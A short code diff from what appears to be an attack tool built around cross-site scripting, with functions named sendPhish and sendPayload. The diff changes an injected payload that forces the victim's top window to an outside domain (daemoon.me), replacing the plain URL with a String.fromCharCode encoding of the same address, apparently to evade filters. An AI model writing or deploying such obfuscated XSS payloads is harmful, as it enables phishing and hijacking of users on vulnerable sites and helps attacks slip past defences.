@@ -236,7 +236,7 @@ function sendPhish() {
 
 function sendTopRedirect() {
     showStatus('Redirecting main window to daemoon.me...');
-    var xss = 'top.location="https://daemoon.me"';
+    var xss = 'top.location=String.fromCharCode(104,116,116,112,115,58,47,47,100,97,101,109,111,111,110,46,109,101)';
     sendPayload(xss);
 }
 </script>
